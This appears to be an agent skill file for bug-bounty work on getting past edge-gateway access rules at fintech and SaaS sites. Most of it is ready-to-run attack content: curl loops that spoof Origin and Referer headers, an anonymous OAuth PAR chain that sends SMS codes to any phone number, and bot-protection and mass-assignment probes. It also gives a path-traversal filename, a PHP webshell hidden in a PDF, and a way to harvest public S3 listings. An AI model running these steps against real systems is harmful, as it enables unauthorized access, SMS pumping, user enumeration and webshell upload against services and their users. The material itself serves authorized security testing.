---
name: edge-gateway-bypass
description: "Use when one gateway denies every path with the same body"
sources: operator_experience
---

# Edge Gateway Access-Control Bypass

Modern fintech/SaaS SPAs sit behind an edge gateway (Envoy is the most common)
that routes to dozens of backend services. The gateway enforces per-route
access rules. Two recurring weak patterns:

1. **RBAC keyed on spoofable headers** — the gateway decides "which SPA may
   call this service" from `Origin`/`Referer`, not from user identity.
   Anyone with curl can mint those headers.
2. **Gateway passes through to services that enforce their own weak gates** —
   OAuth PAR minting, OTP triggers, ATS apply endpoints — where the only
   protections (Turnstile, rate limit, filename/content validation) are
   client-side or absent.

---

## Pattern 1 — Uniform RBAC-deny is a coverage map, not a dead end

**Detection:** every path prefix on the gateway returns the *identical* short
denial body (`RBAC: access denied`, 19 bytes) regardless of depth or verb.
That uniformity means the gateway denied the CALLER, not the route. The route
exists behind it.

**Step 1 — enumerate service names from SPA JS bundles.** Every first-party SPA
leaks its API surface in an env config. Three carriers:

```html
<!-- (a) base64 runtime-env script tag (auth SPAs) -->
<script id="runtime-env" type="application/json">"ewogICJhcHAi..."</script>
<!-- decode in console: JSON.parse(atob(el.textContent)) -->
```

```json
// (b) inline application/json script tag (main/landing SPAs)
{"apiUrls": {"pymeProductApiUrl": "https://prime.example.mx/pyme/web/gateway/v1",
             "surgateApiUrl": "https://prime.example.mx/surgate"},
 "auth": {"authApiUrl": "https://prime.example.mx/auth/api/v1/auth-flow"}}
```

```js
// (c) hardcoded in bundles (grep all downloaded chunks)
// invest-web-gateway-prod.<internal-domain>/api/v1
```

Each `apiUrls.*` entry = one routed service prefix. Collect ALL of them.

**Step 2 — discover first-party SPA origins.** The gateway's allowlist entries
are the hosts that legitimately call it: `auth.<domain>`, `empresa.<domain>`,
`app.<domain>`, `www.<domain>`, sibling-TLD app hosts. Grep bundles for
`https://` hosts on the target's domains.

**Step 3 — sweep routes × origins.** RBAC rules are per-route; only ONE route
needs a missing/loose rule.

```bash
for origin in auth empresa app www; do
  for route in $ROUTES; do
    curl -sk "https://prime.example.mx$route" -X POST \
      -H "Content-Type: application/json" \
      -H "Origin: https://${origin}.example.mx" \
      -H "Referer: https://${origin}.example.mx/" \
      -H "x-plata-timezone: America/Mexico_City" -H "x-plata-locale: es" \
      -d '{}' -w '\n%{http_code}\n'
  done
done
# Distinguish: RBAC body still → route+origin pair denied.
# Spring 400 "Bad Request" HATEOAS → ROUTE OPEN (body validation error).
```

Timezone/locale headers (`x-plata-*` here) come from the SPA's own fetch calls
in the bundle — copy them verbatim.

**Severity:** HIGH when the unlocked route performs auth operations (OAuth PAR
minting, OTP trigger, session/token issuance) — the Origin header is trivially
spoofable by an anonymous curl with no cookies or token. Report as "RBAC
allowlist keyed on spoofable Origin/Referer header" with the full anon-curl
repro.

---

## Pattern 2 — OAuth PAR → authorize → begin-login chain (anon)

When the gateway exposes an OAuth PAR endpoint, the SDK in the JS bundle
(search for `pushAuthorizationRequest`, `executeAuthFlow`, `/par`,
`code_challenge_method`) gives you the exact parameter contract. Anon chain:

```bash
# 0. PKCE material (S256)
CV=$(openssl rand -base64 32 | tr -d '=+/' | tr '+/' '-_')
CC=$(printf '%s' "$CV" | openssl dgst -sha256 -binary | base64 | tr -d '=+/')

# 1. Mint PAR — no auth. client_id + redirect_uri leaked from JS bundle
curl -sk https://prime.example.mx/auth/api/v1/auth-flow/par -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: https://auth.example.mx" -H "Referer: https://auth.example.mx/" \
  -d "response_type=code&scope=openid&code_challenge=$CC&code_challenge_method=S256&state=s&nonce=n&client_id=ORIG_PFAE&redirect_uri=https://example.mx/es/empresa/pfae/callback&installation_id=$UUID&prompt=login&login_hint=$PHONE"
# → {"request_uri":"urn:...:hex"}

# 2. GET /authorize?client_id=X&request_uri=Y → 302; Location leaks
#    client_id, login_mode, expires_at, redirect_url
# 3. POST /begin-login {"requestUri":PAR,"phone":"+52..."} → 200 {"loginFlowId":
#    uuid,"phone":"+521****5678","possibleChallenges":[{"launched":true,
#    "type":"CHALLENGE_TYPE_SEND_OTP"}]} — SMS FIRES for ANY phone, no rate limit
```

**Chains:** SMS bombing / OTP pumping for arbitrary numbers (chain
`hunt-brute-force`); user-existence oracle via differential
`BEGIN_LOGIN_FLOW_ERROR_*` types; PAR replay — mint with benign `redirect_uri`,
exchange via `/token` with attacker redirect if the token endpoint doesn't
re-validate the binding.

---

## Pattern 3 — Spring HATEOAS error-signature route enumeration

Spring Boot behind the gateway returns HATEOAS errors that fingerprint routes
without touching data. Enumerate subpaths by differential:

| Response | Meaning |
|---|---|
| 400 `_embedded.errors` "Failed to convert argument... Cannot construct instance of \`com.x.dto.Foo\`" | Route EXISTS, body shape wrong — the DTO name leaks the expected payload structure |
| 404 `_embedded.errors` "Page Not Found" | No such route |
| 405 "Method [POST] not allowed for URI [...]. Allowed methods: [HEAD, GET]" | Route EXISTS — full verb map revealed |
| 415 "Unsupported Media Type" | Route exists, content-type restricted — retry `application/x-www-form-urlencoded` (OAuth token endpoints) |
| 410 typed error `BEGIN_LOGIN_FLOW_ERROR_TYPE_PAR_EXPIRED` | Flow state machine reached — requestUri must come from `/par` first |
| 500 "INTERNAL: Confirmation [uuid] has invalid status [REJECTED]" | Internal state-machine status names leaked |

Jackson errors also disclose `StreamReadFeature.INCLUDE_SOURCE_IN_LOCATION`
config and full internal package paths — free recon, include in report as
supporting evidence.

---

## Pattern 4 — Client-side-only bot protection on proxied state-changing endpoints

Careers/ATS apply endpoints proxied through the same edge often ship a
Cloudflare Turnstile (sitekey in a constants module, e.g.
`0x4AAAAAAD...`). The browser sets `cf-turnstile-response`; the API may never
validate it.

**Test sequence (all four independent):**

```bash
# 1. Omit the turnstile header entirely
curl -sk https://careers.example.mx/api-internal/apply-job?jobid=5389990008 \
  -X POST -H "Content-Type: application/json" \
  -d '{"first_name":"qa","last_name":"test","email":"qa+test1@mailinator.com"}'
# → {"success":"Candidate saved successfully"} = server-side validation ABSENT

# 2. Garbage token value
-H "cf-turnstile-response: XXXX.DUMMY.TOKEN.XXXX"

# 3. Rate limit: 6 rapid submissions — all 200 = no throttle on candidate creation

# 4. Mass assignment: {"admin":true,"role":"admin","source":"internal_referral",
#    "owner_id":1} — silent acceptance doesn't prove sink, but 422-vs-200
#    differential maps which fields reach the backend model
```

**Upload handling probes (resume/cover-letter fields, base64 content):**
- Filename traversal: `resume_content_filename:"../../evil.pdf"` → 200 = no sanitization
- Polyglot content: PHP webshell inside valid PDF magic (`%PDF-1.4\n...<?php system($_GET['c']); ?>`) → 200 = content not inspected beyond extension
- Extension allowlist differential: `.pdf` ok, `.html`/`.svg` rejected, `.pd` rejected, `shell.php.pdf` **accepted** — map the exact validator
- Determine where attachments land: public bucket prefix scan (`resumes/`, `attachments/`, `uploads/`) on any gateway-proxied S3 listing (see `web2-recon` S3 section). If private (Greenhouse-managed), the finding stays at "no bot protection + no rate limit on PII-collection endpoint" abuse severity.

**Severity:** High when it removes the only automation gate on an endpoint
that collects PII (resumes) or triggers outbound comms (SMS/email/OTP).
Medium standalone.

---

## Pattern 5 — Gateway-proxied S3 public listing (double harvest)

One gateway can proxy TWO different buckets under different prefixes:
`/file-service/static/` → bucket A, `/static/` → bucket B. Check `<Name>`
in each listing XML separately, paginate BOTH (a `?marker=` paginator only
sees its own bucket). Bucket names leak infra naming
(`web-static-prod.<internal-domain>`, `platform-file-service-manager-prod-public`).
Internal-app asset prefixes in bucket B (`internal/`, `hr-portal/`, `crm/`,
`kyc-flow/`) enumerate the company's internal product surface without touching
any protected route. Full technique lives in `web2-recon` (S3 via Cloudflare
proxied subdomains + listing pagination).

---

## Pitfalls

- **RBAC-deny ≠ route nonexistent.** Never conclude "nothing here" from the
  uniform denial — it means the gateway spoke, not the service.
- **POST-body SQLi probes are wasted until the route opens.** The gateway
  discards the request before any backend sees it. Open the route first
  (Pattern 1), then test the backend.
- **OTP brute forcing: ONLY on flows you minted yourself** (your own
  `loginFlowId` from your own throwaway phone). Never verify codes against a
  real user's flow — that is interfering with a live user session, not testing.
- **ATS submissions: use throwaway mailinator-style addresses, cap at a few
  test rows, mark payloads clearly.** You are writing into a real recruiter
  pipeline — keep the noise minimal and reversible-looking.
- **`Origin` alone is often insufficient** — send `Origin` + `Referer` + the
  SPA's own custom headers; some RBAC rules match on the full triple.
- **Both buckets, both proxies** — `/static/` on the auth host and
  `/file-service/static/` on the gateway are different buckets; checking one
  and moving on loses the second harvest.

## Report shape

Every finding in this class must carry a **paste-ready anon curl repro**
(no cookies, no tokens — headers only). Cross-tool bar (bb-methodology):
reproduce via curl AND python `requests`/`urllib` for Critical/High claims.

| Finding shape | Severity guidance |
|---|---|
| RBAC origin-header bypass unlocking auth ops (PAR/OTP/session) | High (spoofable header = anon access) |
| PAR + begin-login with unlimited SMS trigger | High (SMS pumping, user enum) — Critical only if OTP can be verified for arbitrary users |
| Turnstile absent + no rate limit on PII/apply endpoint | High abuse / Medium-High |
| Filename traversal accepted (no confirmed storage path) | Medium — escalate only if attachment URL is guessable/accessible |
| S3 listing with internal infra names + modestly sensitive docs | Medium |
| S3 listing with PII (debt-collector RFCs/emails, internal KB) | Medium-High |

## Related Skills & Chains

- **`hunt-api-misconfig`** — owns mass-assignment/JWT/CORS classes and the
  version-prefix discovery pattern; this skill owns the gateway deny-body
  detection + header-keyed allowlist bypass that precedes those tests.
- **`hunt-captcha-bypass`** — owns the CAPTCHA-bypass class broadly; Pattern 4
  here adds the "proxied ATS endpoint + Turnstile constants module in JS"
  discovery recipe and the upload-handling probe sequence.
- **`hunt-brute-force`** — OTP/SMS pumping and rate-limit mapping chain.
- **`hunt-forgot-password`** — same begin-login/trigger shape on reset flows.
- **`web2-recon`** — S3 listing/pagination and JS-bundle env extraction upstream.
- **`triage-validation`** — Server-Policy-vs-State gate applies to all
  "accepted silently" mass-assignment claims.
